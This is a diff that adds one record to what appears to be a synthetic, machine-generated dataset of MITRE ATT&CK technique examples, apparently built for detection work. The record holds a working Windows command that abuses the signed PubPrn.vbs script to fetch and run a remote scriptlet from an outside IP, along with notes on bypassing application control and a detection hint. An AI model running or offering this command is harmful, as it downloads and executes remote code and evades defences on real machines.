@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1216",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "cscript.exe //nologo C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\PubPrn.vbs 127.0.0.1 script:https://203.0.113.33/print.sct",
+  "explanation": "Abuses PubPrn.vbs via cscript to load a remote scriptlet using the script: moniker. This is a known system script proxy path under user privileges.",
+  "rationale_steps": [
+    "From PowerShell, invoke cscript against PubPrn.vbs with a loopback printer and a script: moniker.",
+    "PubPrn.vbs triggers WSH to fetch and run the remote .sct payload.",
+    "Because PubPrn.vbs and cscript are signed system scripts, this can bypass application control; flag use of script: moniker with PubPrn.vbs."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1216-fce25ec9-f6c1d8b0",
+  "source_prompt_hash": "fce25ec9",
+  "timestamp_utc": "2025-09-30T07:05:43.585605Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
